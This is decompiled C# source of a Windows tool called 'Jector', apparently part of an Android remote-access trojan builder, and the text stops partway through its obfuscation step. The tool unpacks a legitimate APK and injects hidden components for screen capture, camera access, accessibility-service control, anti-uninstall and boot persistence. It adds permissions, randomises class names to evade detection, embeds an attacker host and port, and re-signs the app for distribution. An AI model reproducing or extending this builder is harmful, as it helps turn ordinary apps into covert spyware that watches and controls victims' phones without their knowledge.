using System;
using System.Collections;
using System.Collections.Generic;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.IO.Compression;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Text;
using System.Threading;
using System.Windows.Forms;
using System.Xml;
using DrakeUI.Framework;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;

// Token: 0x02000082 RID: 130
[DesignerGenerated]
public partial class Jector : Form
{
	// Token: 0x17000105 RID: 261
	// (get) Token: 0x060005F0 RID: 1520 RVA: 0x00097C08 File Offset: 0x00095E08
	protected override CreateParams CreateParams
	{
		get
		{
			CreateParams createParams = base.CreateParams;
			createParams.ExStyle |= 128;
			return createParams;
		}
	}

	// Token: 0x060005F3 RID: 1523 RVA: 0x0009ABFC File Offset: 0x00098DFC
	public Jector()
	{
		base.FormClosing += this.Form1_FormClosing;
		base.Load += this.Form1_Load;
		this.N_RequestPermissions = "";
		this.N_RequestAccess = "";
		this.N_newEngineWorkerins = "AbddSfsvasDFBetgrnsrtnatrhjxyghwftgafsgxjbrTHAERdvergesrg";
		this.N_CommandsService = "";
		this.NStartScreenCap = "";
		this.N_WakeupActivity = "";
		this.N_RequestDraw = "";
		this.N_RequestBattery = "";
		this.N__CameraActivity_ = "";
		this.N__RequestCapScreen_ = "";
		this.N__webviewer_ = "";
		this.N_HandelScreenCap = "";
		this.newgetbyts = "";
		this.newsrvrun = "";
		this.split1 = "";
		this.split2 = "";
		this.split3 = "";
		this.split4 = "";
		this.newhost = "";
		this.newport = "";
		this.newkey = "";
		this.newalive = "";
		this.newname = "";
		this.neweco = "";
		this.newconect = "";
		this.newsokt = "";
		this.newstrtconct = "";
		this.newcnl = "";
		this.newcnm = "";
		this.newsndmthd = "";
		this.newforuce = "";
		this.newplgs = "";
		this.NEWRANDOM = "";
		this.usersper = "";
		this.usedraw = "";
		this.useruninstall = "";
		this.ALLPRIMSLIST = new List<string>();
		this.cou = 1;
		this.TK = "BSN12345678901234567";
		this.need_write = false;
		this.need_battery = false;
		this.need_read = false;
		this.need_forground = false;
		this.need_syswinow = false;
		this.need_boot = false;
		this.need_all = false;
		this.ASKPRIM_all = false;
		this.Once = false;
		this.HoldMainThread = false;
		this.WorkingDir = "";
		this.FoundJava = false;
		this.apktemp = "";
		this.apktoolpath = "";
		this.Apksignerpath = "";
		this.ApkZIPpath = "";
		this.outputapk = "";
		this.originalapkname = "";
		this.Apkeditorpath = "";
		this.protectfinished = false;
		this.rshit = null;
		this.cou3 = 0;
		this.InitializeComponent();
	}

	// Token: 0x060005F4 RID: 1524 RVA: 0x0009AE9C File Offset: 0x0009909C
	public void Translateme()
	{
		string language = RegistryHandler.Get_Language();
		if (Operators.CompareString(language, "AR", false) != 0)
		{
			if (Operators.CompareString(language, "CN", false) != 0)
			{
				this.ComboPrims.Text = "Only Needed";
			}
			else
			{
				this.ComboPrims.Text = "只需要";
				this.Label7.Text = "用户名";
				this.Label3.Text = "连接键";
				this.Label1.Text = "主机名或 IP";
				this.Label2.Text = "连接端口";
				this.Label4.Text = "目标应用文件夹";
				this.Button1.Text = "选择";
				this.Label5.Text = "目标活动文件 (.smali)";
				this.addactiv.Text = "添加";
				this.removeactiv.Text = "删除";
				this.checksuper.Text = "无障碍服务";
				this.checkkill.Text = "反删除";
				this.checkautoclick.Text = "自动授予权限";
				this.checkDraw.Text = "授予在应用程序上绘制";
				this.checkkeepscreen.Text = "保持屏幕开启";
				this.CheckAutomatic.Text = Codes.Translate(this.CheckAutomatic.Text, "en", "zh");
				this.checkonlymain.Text = Codes.Translate(this.checkonlymain.Text, "en", "zh");
				this.checkprotector.Text = Codes.Translate(this.checkprotector.Text, "en", "zh");
				this.selectapkbtn.Text = Codes.Translate(this.selectapkbtn.Text, "en", "zh");
				this.addactiv.Text = Codes.Translate(this.addactiv.Text, "en", "zh");
				this.removeactiv.Text = Codes.Translate(this.removeactiv.Text, "en", "zh");
				this.Label6.Text = Codes.Translate(this.Label6.Text, "en", "zh");
				this.Label14.Text = "权限";
				this.titletext.Watermark = "通知标题";
				this.msgtext.Watermark = "通知消息";
				this.Label12.Text = "自定义通知";
				this.Button3.Text = "开始";
				this.maintapcontrols.TabPages[0].Text = "联系";
				this.maintapcontrols.TabPages[1].Text = "目标";
				this.maintapcontrols.TabPages[2].Text = "选项";
				this.maintapcontrols.TabPages[3].Text = "注入";
			}
		}
		else
		{
			this.ComboPrims.Text = "فقط المطلوبة";
			this.Label7.Text = "إسم المستخدم";
			this.Label3.Text = "مفتاح الاتصال";
			this.Label1.Text = "هوست او أيبي";
			this.Label2.Text = "المنفذ";
			this.Label4.Text = "مجلد التطبيق الهدف";
			this.Button1.Text = "إختيار";
			this.Label5.Text = "ملف الحقن الهدف (.smali)";
			this.addactiv.Text = "إضافة";
			this.removeactiv.Text = "حذف";
			this.checksuper.Text = "صلاحية الوصول";
			this.checkkill.Text = "منع الحذف";
			this.checkautoclick.Text = "صلاحيات تلقائية";
			this.checkDraw.Text = "صلاحية ظهور فوق التطبيقات";
			this.Label14.Text = "الصلاحيات";
			this.titletext.Watermark = "عنوان الأشعار";
			this.msgtext.Watermark = "محتوى الأشعار";
			this.Label12.Text = "إشعار مخصص";
			this.CheckAutomatic.Text = Codes.Translate(this.CheckAutomatic.Text, "en", "ar");
			this.checkonlymain.Text = Codes.Translate(this.checkonlymain.Text, "en", "ar");
			this.checkprotector.Text = Codes.Translate(this.checkprotector.Text, "en", "ar");
			this.selectapkbtn.Text = Codes.Translate(this.selectapkbtn.Text, "en", "ar");
			this.addactiv.Text = Codes.Translate(this.addactiv.Text, "en", "ar");
			this.removeactiv.Text = Codes.Translate(this.removeactiv.Text, "en", "ar");
			this.Label6.Text = Codes.Translate(this.Label6.Text, "en", "ar");
			this.Button3.Text = "حقن";
			this.maintapcontrols.TabPages[0].Text = "الأتصال";
			this.maintapcontrols.TabPages[1].Text = "الهدف";
			this.maintapcontrols.TabPages[2].Text = "إعدادات";
			this.maintapcontrols.TabPages[3].Text = "بناء";
			this.checkkeepscreen.Text = "إبقاء الشاشة مضاءة";
		}
	}

	// Token: 0x060005F5 RID: 1525 RVA: 0x0009B44C File Offset: 0x0009964C
	public object RandomShit(int minCharacters, int maxCharacters)
	{
		string text = "qazQAZwsxWSXedcEDCrfvRFVtgbTGByhnYHNujmUJMikIKolOLpP";
		if (this._0024STATIC_0024RandomShit_00242021C88_0024r_0024Init == null)
		{
			Interlocked.CompareExchange<StaticLocalInitFlag>(ref this._0024STATIC_0024RandomShit_00242021C88_0024r_0024Init, new StaticLocalInitFlag(), null);
		}
		bool flag = false;
		try
		{
			Monitor.Enter(this._0024STATIC_0024RandomShit_00242021C88_0024r_0024Init, ref flag);
			if (this._0024STATIC_0024RandomShit_00242021C88_0024r_0024Init.State == 0)
			{
				this._0024STATIC_0024RandomShit_00242021C88_0024r_0024Init.State = 2;
				this._0024STATIC_0024RandomShit_00242021C88_0024r = new Random();
			}
			else if (this._0024STATIC_0024RandomShit_00242021C88_0024r_0024Init.State == 2)
			{
				throw new IncompleteInitialization();
			}
		}
		finally
		{
			this._0024STATIC_0024RandomShit_00242021C88_0024r_0024Init.State = 1;
			if (flag)
			{
				Monitor.Exit(this._0024STATIC_0024RandomShit_00242021C88_0024r_0024Init);
			}
		}
		int num = this._0024STATIC_0024RandomShit_00242021C88_0024r.Next(minCharacters, maxCharacters);
		StringBuilder stringBuilder = new StringBuilder();
		int num2 = num;
		checked
		{
			for (int i = 1; i <= num2; i++)
			{
				int startIndex = this._0024STATIC_0024RandomShit_00242021C88_0024r.Next(0, text.Length);
				stringBuilder.Append(text.Substring(startIndex, 1));
			}
			this.cou++;
			return stringBuilder.ToString() + Conversions.ToString(this.cou);
		}
	}

	// Token: 0x060005F6 RID: 1526 RVA: 0x0009B574 File Offset: 0x00099774
	private int GenerateRandomNumber(int m0, int m1)
	{
		if (this._0024STATIC_0024GenerateRandomNumber_0024202888_0024Random_Number_0024Init == null)
		{
			Interlocked.CompareExchange<StaticLocalInitFlag>(ref this._0024STATIC_0024GenerateRandomNumber_0024202888_0024Random_Number_0024Init, new StaticLocalInitFlag(), null);
		}
		bool flag = false;
		try
		{
			Monitor.Enter(this._0024STATIC_0024GenerateRandomNumber_0024202888_0024Random_Number_0024Init, ref flag);
			if (this._0024STATIC_0024GenerateRandomNumber_0024202888_0024Random_Number_0024Init.State == 0)
			{
				this._0024STATIC_0024GenerateRandomNumber_0024202888_0024Random_Number_0024Init.State = 2;
				this._0024STATIC_0024GenerateRandomNumber_0024202888_0024Random_Number = new Random();
			}
			else if (this._0024STATIC_0024GenerateRandomNumber_0024202888_0024Random_Number_0024Init.State == 2)
			{
				throw new IncompleteInitialization();
			}
		}
		finally
		{
			this._0024STATIC_0024GenerateRandomNumber_0024202888_0024Random_Number_0024Init.State = 1;
			if (flag)
			{
				Monitor.Exit(this._0024STATIC_0024GenerateRandomNumber_0024202888_0024Random_Number_0024Init);
			}
		}
		return this._0024STATIC_0024GenerateRandomNumber_0024202888_0024Random_Number.Next(m0, m1);
	}

	// Token: 0x060005F7 RID: 1527 RVA: 0x0009B62C File Offset: 0x0009982C
	private void Button1_Click(object sender, EventArgs e)
	{
		FolderBrowserDialog folderBrowserDialog = new FolderBrowserDialog();
		folderBrowserDialog.RootFolder = Environment.SpecialFolder.Desktop;
		folderBrowserDialog.SelectedPath = "C:\\";
		folderBrowserDialog.Description = "Select Path for Decompile Apk";
		if (folderBrowserDialog.ShowDialog() == DialogResult.OK)
		{
			this.FolderPath.Text = folderBrowserDialog.SelectedPath;
			this.TheApkPath = this.FolderPath.Text;
		}
	}

	// Token: 0x060005F8 RID: 1528 RVA: 0x0009B68C File Offset: 0x0009988C
	private void addactiv_click(object sender, EventArgs e)
	{
		string text = Conversions.ToString(5);
		if (this.FolderPath.Text != null)
		{
			text = this.FolderPath.Text;
			OpenFileDialog openFileDialog = new OpenFileDialog();
			openFileDialog.InitialDirectory = text;
			openFileDialog.Multiselect = true;
			openFileDialog.DefaultExt = ".smali";
			openFileDialog.Title = "Select Path for Apk Activity to inject";
			string[] array = new string[3];
			if (openFileDialog.ShowDialog() == DialogResult.OK)
			{
				array = openFileDialog.FileNames;
				string[] array2 = array;
				foreach (string text2 in array2)
				{
					string text3 = text2;
					if (text3.ToLower().EndsWith(".smali") && !this.Activlist.Items.Contains(text3.Replace(text, ">")))
					{
						this.Activlist.Items.Add(text3.Replace(text, ">"));
					}
				}
			}
		}
		else
		{
			EagleAlert.ShowWarning("Select Apk Folder First");
		}
	}

	// Token: 0x060005F9 RID: 1529 RVA: 0x0009B790 File Offset: 0x00099990
	private string D(string v)
	{
		return Encoding.UTF8.GetString(Convert.FromBase64String(v));
	}

	// Token: 0x060005FA RID: 1530 RVA: 0x0009B7B0 File Offset: 0x000999B0
	private void Button3_Click(object sender, EventArgs e)
	{
		this.log.Text = "";
		if (this.CheckAllValuse())
		{
			this.log.AppendText("Starting Injection...");
			this.Button3.Enabled = false;
			this.Startwork();
		}
		else
		{
			this.log.Text = "check values";
		}
	}

	// Token: 0x060005FB RID: 1531 RVA: 0x0009B80C File Offset: 0x00099A0C
	private void cmdOutputHandler(object sender, DataReceivedEventArgs e)
	{
		checked
		{
			if (!string.IsNullOrEmpty(e.Data))
			{
				try
				{
					Jector._Closure_0024__289_002D0 arg = null;
					Jector._Closure_0024__289_002D0 CS_0024_003C_003E8__locals0 = new Jector._Closure_0024__289_002D0(arg);
					CS_0024_003C_003E8__locals0._0024VB_0024Me = this;
					CS_0024_003C_003E8__locals0._0024VB_0024Local_msg = e.Data;
					if (CS_0024_003C_003E8__locals0._0024VB_0024Local_msg.Contains("java is not recognized"))
					{
						base.Invoke(new VB_0024AnonymousDelegate_0(delegate()
						{
							this.log.AppendText(Environment.NewLine + "> Java not installed : go to google and install (java jdk)");
						}));
					}
					if (CS_0024_003C_003E8__locals0._0024VB_0024Local_msg.StartsWith("I:"))
					{
						base.Invoke(new VB_0024AnonymousDelegate_0(delegate()
						{
							CS_0024_003C_003E8__locals0._0024VB_0024Me.log.AppendText(Environment.NewLine + CS_0024_003C_003E8__locals0._0024VB_0024Local_msg.Replace("I:", "> "));
						}));
					}
					else if (CS_0024_003C_003E8__locals0._0024VB_0024Local_msg.Contains("[PROTECT]") && !CS_0024_003C_003E8__locals0._0024VB_0024Local_msg.Contains("Writing:"))
					{
						base.Invoke(new VB_0024AnonymousDelegate_0(delegate()
						{
							CS_0024_003C_003E8__locals0._0024VB_0024Me.log.AppendText(Environment.NewLine + CS_0024_003C_003E8__locals0._0024VB_0024Local_msg);
						}));
					}
					else if (CS_0024_003C_003E8__locals0._0024VB_0024Local_msg.StartsWith("E:"))
					{
						base.Invoke(new VB_0024AnonymousDelegate_0(delegate()
						{
							CS_0024_003C_003E8__locals0._0024VB_0024Me.log.AppendText(Environment.NewLine + CS_0024_003C_003E8__locals0._0024VB_0024Local_msg.Replace("E:", "ERROR :"));
						}));
					}
					if (CS_0024_003C_003E8__locals0._0024VB_0024Local_msg.Contains("[PROTECT] Saved to"))
					{
						this.protectfinished = true;
					}
					if (CS_0024_003C_003E8__locals0._0024VB_0024Local_msg.Contains("Java(TM)") | CS_0024_003C_003E8__locals0._0024VB_0024Local_msg.Contains("OpenJDK"))
					{
						if (!this.Once)
						{
							this.Once = true;
							base.Invoke(new VB_0024AnonymousDelegate_0(delegate()
							{
								this.log.AppendText(Environment.NewLine + "> Extract New Data..");
							}));
							this.originalapkname = Path.GetFileName(this.TargetApktext.Text);
							File.Copy(this.TargetApktext.Text, this.WorkingDir + "\\temp.apk");
							File.WriteAllBytes(this.apktoolpath, Resources.apktool);
							File.WriteAllBytes(this.Apksignerpath, Resources.signapk);
							File.WriteAllBytes(this.ApkZIPpath, Resources.zipalign);
							File.WriteAllBytes(this.Apkeditorpath, Resources.APKEditor);
							base.Invoke(new VB_0024AnonymousDelegate_0(delegate()
							{
								this.log.AppendText(Environment.NewLine + "> Decompile Apk Start..");
							}));
							this.ExecuteCommand("cd " + this.WorkingDir);
							this.ExecuteCommand(string.Concat(new string[]
							{
								"java -jar \"",
								this.apktoolpath,
								"\" d -f \"",
								this.apktemp,
								"\" -o \"",
								this.TheApkPath,
								"\""
							}));
						}
					}
					else if (CS_0024_003C_003E8__locals0._0024VB_0024Local_msg.Contains("Copying original files"))
					{
						this.HoldMainThread = false;
					}
					else if (CS_0024_003C_003E8__locals0._0024VB_0024Local_msg.Contains("Built apk"))
					{
						while (!File.Exists(this.outputapk))
						{
							Thread.Sleep(1000);
						}
						base.Invoke(new VB_0024AnonymousDelegate_0(delegate()
						{
							this.log.AppendText(Environment.NewLine + "> Zip Align..");
						}));
						string command = string.Concat(new string[]
						{
							this.ApkZIPpath,
							" 4 \"",
							this.outputapk,
							"\" \"",
							this.outputapk.Replace("Ready.apk", "Ready_zip.apk"),
							"\""
						});
						string text = this.outputapk.Replace("Ready.apk", "Ready_zip.apk");
						this.ExecuteCommand(command);
						while (!File.Exists(text))
						{
							Thread.Sleep(5000);
						}
						File.Delete(this.outputapk);
						if (this.checkprotector.Checked)
						{
							base.Invoke(new VB_0024AnonymousDelegate_0(delegate()
							{
								this.log.AppendText(Environment.NewLine + "> Protect Apk..");
							}));
							string text2 = text.Replace(".apk", "_protected.apk");
							string command2 = string.Concat(new string[]
							{
								"java -jar ",
								this.Apkeditorpath,
								" p  -i \"",
								text,
								"\""
							});
							this.ExecuteCommand(command2);
							while (!File.Exists(text2) | !this.protectfinished)
							{
								Thread.Sleep(1000);
							}
							File.Delete(text);
							text = text2;
						}
						base.Invoke(new VB_0024AnonymousDelegate_0(delegate()
						{
							this.log.AppendText(Environment.NewLine + "> Sign APK..");
						}));
						File.WriteAllBytes(this.WorkingDir + "\\certificate.pem", Resources.c);
						File.WriteAllBytes(this.WorkingDir + "\\key.pk8", Resources.k);
						string path = this.WorkingDir + "\\out\\" + this.originalapkname.Replace(".apk", "_Jected.apk");
						string command3 = string.Concat(new string[]
						{
							"java -jar \"",
							this.Apksignerpath,
							"\" sign --key ",
							this.WorkingDir,
							"\\key.pk8 --cert ",
							this.WorkingDir,
							"\\certificate.pem  --v2-signing-enabled true --v3-signing-enabled true --out \"",
							this.WorkingDir,
							"\\out\\",
							this.originalapkname.Replace(".apk", "_Jected.apk"),
							"\" \"",
							text,
							"\""
						});
						this.ExecuteCommand(command3);
						while (!File.Exists(path))
						{
							Thread.Sleep(5000);
						}
						File.Delete(text);
						base.Invoke(new VB_0024AnonymousDelegate_0(delegate()
						{
							this.log.AppendText(string.Concat(new string[]
							{
								Environment.NewLine,
								"-----------Finished-------------",
								Environment.NewLine,
								"> Host: ",
								this.Host.Text,
								Environment.NewLine,
								"> Port: ",
								this.Port.Text,
								Environment.NewLine,
								"> App: ",
								this.originalapkname.Replace(".apk", "")
							}));
						}));
						int num = 1;
						do
						{
							Thread.Sleep(100);
							Application.DoEvents();
							num++;
						}
						while (num <= 30);
						Process.Start(this.WorkingDir + "\\out");
						this.StopCommandPrompt();
					}
				}
				catch (Exception ex)
				{
					Jector._Closure_0024__289_002D1 arg2 = null;
					Jector._Closure_0024__289_002D1 CS_0024_003C_003E8__locals1 = new Jector._Closure_0024__289_002D1(arg2);
					CS_0024_003C_003E8__locals1._0024VB_0024Me = this;
					Exception 0024VB_0024Local_ex = ex;
					CS_0024_003C_003E8__locals1._0024VB_0024Local_ex = 0024VB_0024Local_ex;
					base.Invoke(new VB_0024AnonymousDelegate_0(delegate()
					{
						CS_0024_003C_003E8__locals1._0024VB_0024Me.log.AppendText(Environment.NewLine + "Global Error: " + CS_0024_003C_003E8__locals1._0024VB_0024Local_ex.Message);
					}));
				}
			}
		}
	}

	// Token: 0x060005FC RID: 1532 RVA: 0x0009BE0C File Offset: 0x0009A00C
	private void StopCommandPrompt()
	{
		try
		{
			this.cmdProcess.CloseMainWindow();
			this.cmdProcess.Close();
			this.cmdProcess.Dispose();
		}
		catch (Exception)
		{
		}
	}

	// Token: 0x060005FD RID: 1533 RVA: 0x00002F33 File Offset: 0x00001133
	private void ExecuteCommand(string command)
	{
		this.cmdProcess.StandardInput.WriteLine(command);
		this.cmdProcess.StandardInput.Flush();
	}

	// Token: 0x060005FE RID: 1534 RVA: 0x0009BE50 File Offset: 0x0009A050
	public void Startwork()
	{
		if (this.CheckAutomatic.Checked)
		{
			this.log.AppendText(Environment.NewLine + "> Automatic injection Started..");
			this.log.AppendText(Environment.NewLine + "> Preparation Started..");
			this.HoldMainThread = true;
			Codes.GetDriv();
			string text;
			try
			{
				text = Codes.GenerateRandomFolderName("jector");
			}
			catch (Exception ex)
			{
				Exception ex2 = ex;
				this.log.AppendText("Error Create Work Folder:" + ex2.Message);
				return;
			}
			this.WorkingDir = text;
			this.TheApkPath = this.WorkingDir + "\\temp";
			if (!Directory.Exists(this.TheApkPath))
			{
				Directory.CreateDirectory(this.TheApkPath);
			}
			this.cmdProcess = new Process();
			ProcessStartInfo processStartInfo = new ProcessStartInfo();
			processStartInfo.FileName = "cmd.exe";
			processStartInfo.RedirectStandardOutput = true;
			processStartInfo.RedirectStandardInput = true;
			processStartInfo.RedirectStandardError = true;
			processStartInfo.UseShellExecute = false;
			processStartInfo.CreateNoWindow = true;
			processStartInfo.WindowStyle = ProcessWindowStyle.Hidden;
			this.cmdProcess.EnableRaisingEvents = true;
			this.cmdProcess.StartInfo = processStartInfo;
			this.cmdProcess.OutputDataReceived += this.cmdOutputHandler;
			this.cmdProcess.ErrorDataReceived += this.cmdOutputHandler;
			this.cmdProcess.Start();
			this.cmdProcess.BeginOutputReadLine();
			this.cmdProcess.BeginErrorReadLine();
			this.apktemp = text + "\\temp.apk";
			this.apktoolpath = text + "\\apktool.jar";
			this.Apksignerpath = text + "\\signapk.jar";
			this.ApkZIPpath = text + "\\zipalign.exe";
			this.Apkeditorpath = text + "\\ApkEditor.jar";
			this.ExecuteCommand("java -version");
			do
			{
				Thread.Sleep(1);
				Application.DoEvents();
			}
			while (this.HoldMainThread);
		}
		else
		{
			this.log.AppendText(Environment.NewLine + "> Manually injection Started...");
		}
		this.log.AppendText(Environment.NewLine + "> Check Permissions...");
		while (Codes.FileInUse(this.TheApkPath + "\\AndroidManifest.xml") | !File.Exists(this.TheApkPath + "\\AndroidManifest.xml"))
		{
			Thread.Sleep(1000);
		}
		string text2 = this.UpdateVersions(File.ReadAllText(this.TheApkPath + "\\AndroidManifest.xml"));
		checked
		{
			try
			{
				if (!text2.ToLower().Contains("android.permission.WRITE_EXTERNAL_STORAGE".ToLower()))
				{
					this.need_write = true;
				}
				if (!text2.ToLower().Contains("android.permission.REQUEST_IGNORE_BATTERY_OPTIMIZATIONS".ToLower()))
				{
					this.need_battery = true;
				}
				if (!text2.ToLower().Contains("android.permission.READ_EXTERNAL_STORAGE".ToLower()))
				{
					this.need_read = true;
				}
				if (!text2.ToLower().Contains("android.permission.FOREGROUND_SERVICE".ToLower()))
				{
					this.need_forground = true;
				}
				if (!text2.ToLower().Contains("android.permission.SYSTEM_ALERT_WINDOW".ToLower()))
				{
					this.need_syswinow = true;
				}
				if (!text2.ToLower().Contains("android.permission.RECEIVE_BOOT_COMPLETED".ToLower()))
				{
					this.need_boot = true;
				}
				if (Operators.CompareString(this.ComboPrims.Text, "Only Needed", false) != 0)
				{
					this.need_all = true;
					this.ASKPRIM_all = true;
					string[] array = Resources.ALLPRIM.Split(new char[]
					{
						'#'
					});
					string[] array2 = array;
					foreach (string text3 in array2)
					{
						try
						{
							if (!string.IsNullOrEmpty(text3) && !text2.ToLower().Contains(text3.ToLower()))
							{
								this.ALLPRIMSLIST.Add(text3);
							}
						}
						catch (Exception)
						{
						}
					}
				}
				this.log.AppendText(Environment.NewLine + "> Coding AndroidManifest...");
				this.cou = this.GenerateRandomNumber(0, 5000);
				this.NStartScreenCap = Conversions.ToString(this.RandommMad(25, 35));
				this.N_CommandsService = Conversions.ToString(this.RandommMad(25, 35));
				this.N_newEngineWorkerins = Conversions.ToString(this.RandommMad(25, 35));
				this.N_RequestAccess = Conversions.ToString(this.RandommMad(25, 35));
				this.N_RequestPermissions = Conversions.ToString(this.RandommMad(25, 35));
				this.N_HandelScreenCap = Conversions.ToString(this.RandommMad(25, 35));
				this.N_WakeupActivity = Conversions.ToString(this.RandommMad(25, 35));
				this.N_RequestDraw = Conversions.ToString(this.RandommMad(25, 35));
				this.N_RequestBattery = Conversions.ToString(this.RandommMad(25, 35));
				this.N__CameraActivity_ = Conversions.ToString(this.RandommMad(25, 35));
				this.N__RequestCapScreen_ = Conversions.ToString(this.RandommMad(25, 35));
				this.N__webviewer_ = Conversions.ToString(this.RandommMad(25, 35));
				string[] array4 = File.ReadAllLines(this.TheApkPath + "\\AndroidManifest.xml");
				while (Codes.FileInUse(this.TheApkPath + "\\apktool.yml") | !File.Exists(this.TheApkPath + "\\apktool.yml"))
				{
					Thread.Sleep(1000);
				}
				string[] array5 = File.ReadAllLines(this.TheApkPath + "\\apktool.yml");
				int num = array5.Length - 1;
				for (int j = 0; j <= num; j++)
				{
					if (array5[j].ToLower().Contains("targetSdkVersion".ToLower()))
					{
						array5[j] = "  targetSdkVersion: '29'";
						File.WriteAllLines(this.TheApkPath + "\\apktool.yml", array5);
						IL_5BF:
						int num2 = array4.Length - 1;
						for (int k = 1; k <= num2; k++)
						{
							if (this.need_write && array4[k].ToLower().Contains("<uses-permission"))
							{
								array4[k] = array4[k] + "\r\n" + Resources.WritePrim;
								this.need_write = false;
							}
							if (this.need_battery && array4[k].ToLower().Contains("<uses-permission"))
							{
								array4[k] = array4[k] + "\r\n" + Resources.batteryprim;
								this.need_battery = false;
							}
							if (this.need_read && array4[k].ToLower().Contains("<uses-permission"))
							{
								array4[k] = array4[k] + "\r\n" + Resources.ReadPrim;
								this.need_read = false;
							}
							if (this.need_forground && array4[k].ToLower().Contains("<uses-permission"))
							{
								array4[k] = array4[k] + "\r\n" + Resources.FORGROUD;
								this.need_forground = false;
							}
							if (this.need_syswinow && array4[k].ToLower().Contains("<uses-permission"))
							{
								array4[k] = array4[k] + "\r\n" + Resources.SystemwindowPrim;
								this.need_syswinow = false;
							}
							if (this.need_boot && array4[k].ToLower().Contains("<uses-permission"))
							{
								array4[k] = array4[k] + "\r\n" + Resources.BootPrim;
								this.need_boot = false;
							}
							if (this.need_all && array4[k].ToLower().Contains("<uses-permission"))
							{
								foreach (string str in this.ALLPRIMSLIST)
								{
									array4[k] = array4[k] + "\r\n" + str;
								}
								this.need_all = false;
							}
							if (array4[k].ToLower().Contains("<application"))
							{
								if (!array4[k].ToLower().Contains("requestLegacyExternalStorage".ToLower()))
								{
									array4[k] = array4[k].Replace("<application", "<application android:requestLegacyExternalStorage=\"true\"");
								}
								array4[k] = array4[k] + Environment.NewLine + Resources.CypherMini.Replace("RequestPermissions", this.N_RequestPermissions).Replace("RequestAccess", this.N_RequestAccess).Replace("EngineWorkerins", this.N_newEngineWorkerins).Replace("CommandsService", this.N_CommandsService).Replace("StartScreenCap", this.NStartScreenCap).Replace("webviewer", this.N__webviewer_).Replace("RequestCapScreen", this.N__RequestCapScreen_).Replace("CameraActivity", this.N__CameraActivity_).Replace("RequestBattery", this.N_RequestBattery).Replace("HandelScreenCap", this.N_HandelScreenCap).Replace("RequestDraw", this.N_RequestDraw).Replace("WakeupActivity", this.N_WakeupActivity);
								IL_90A:
								File.WriteAllLines(this.TheApkPath + "\\AndroidManifest.xml", array4);
								goto IL_94E;
							}
						}
						goto IL_90A;
					}
				}
				goto IL_5BF;
			}
			catch (Exception ex3)
			{
				Exception ex4 = ex3;
				this.log.AppendText("Error Manifest :" + ex4.Message);
			}
			IL_94E:
			string text4 = null;
			try
			{
				this.log.AppendText(Environment.NewLine + "> Inject Data To Apk...");
				int num3 = 2;
				while (Directory.Exists(this.TheApkPath + "\\smali_classes" + num3.ToString()))
				{
					num3++;
					if (num3 > 16)
					{
						IL_9FF:
						if (text4 == null)
						{
							Directory.CreateDirectory(this.TheApkPath + "\\smali_classes2");
							Directory.CreateDirectory(this.TheApkPath + "\\smali_classes2\\effectservicecimpl\\marketpush");
							text4 = this.TheApkPath + "\\smali_classes2";
						}
						if (!File.Exists(text4 + "\\data.zip"))
						{
							File.WriteAllBytes(text4 + "\\data.zip", Resources.APPS);
						}
						ZipFile.ExtractToDirectory(text4 + "\\data.zip", text4);
						File.Delete(text4 + "\\data.zip");
						Thread.Sleep(1);
						if (!Directory.Exists(this.TheApkPath + "\\res\\xml"))
						{
							Directory.CreateDirectory(this.TheApkPath + "\\res\\xml");
						}
						File.WriteAllText(this.TheApkPath + "\\res\\xml\\accessibilityprivatesrcapp.xml", Resources.accessibilityprivatesrcapp);
						if (!Directory.Exists(this.TheApkPath + "\\res\\xml"))
						{
							Directory.CreateDirectory(this.TheApkPath + "\\res\\xml");
						}
						goto IL_B41;
					}
				}
				Directory.CreateDirectory(this.TheApkPath + "\\smali_classes" + num3.ToString());
				Directory.CreateDirectory(this.TheApkPath + "\\smali_classes" + num3.ToString() + "\\effectservicecimpl\\marketpush");
				text4 = this.TheApkPath + "\\smali_classes" + num3.ToString();
				goto IL_9FF;
			}
			catch (Exception ex5)
			{
				Exception ex6 = ex5;
				this.log.AppendText("Error Data :" + ex6.Message);
			}
			IL_B41:
			try
			{
				this.log.AppendText(Environment.NewLine + "> Encryption...");
				string[] files = Directory.GetFiles(text4 + "\\effectservicecimpl\\marketpush");
				int minCharacters = 30;
				int maxCharacters = 35;
				this.newgetbyts = Conversions.ToString(this.RandomShit(30, 35));
				this.newsrvrun = Conversions.ToString(this.RandomShit(30, 35));
				this.split1 = Conversions.ToString(this.RandomShit(4, 4));
				this.split2 = Conversions.ToString(this.RandomShit(4, 4));
				this.split3 = Conversions.ToString(this.RandomShit(4, 4));
				this.split4 = Conversions.ToString(this.RandomShit(4, 4));
				this.newhost = Conversions.ToString(this.RandomShit(30, 35));
				this.newport = Conversions.ToString(this.RandomShit(30, 35));
				this.newkey = Conversions.ToString(this.RandomShit(30, 35));
				this.newalive = Conversions.ToString(this.RandomShit(30, 35));
				this.newname = Conversions.ToString(this.RandomShit(30, 35));
				this.neweco = Conversions.ToString(this.RandomShit(30, 35));
				this.newconect = Conversions.ToString(this.RandomShit(30, 35));
				this.newsokt = Conversions.ToString(this.RandomShit(30, 35));
				this.newstrtconct = Conversions.ToString(this.RandomShit(30, 35));
				this.newcnl = Conversions.ToString(this.RandomShit(30, 35));
				this.newcnm = Conversions.ToString(this.RandomShit(30, 35));
				this.newsndmthd = Conversions.ToString(this.RandomShit(30, 35));
				this.newplgs = Conversions.ToString(this.RandomShit(30, 35));
				this.NEWRANDOM = this.madladstr();
				this.newforuce = "QsdvgaerEARGar";
				string[] array6 = files;
				foreach (string path in array6)
				{
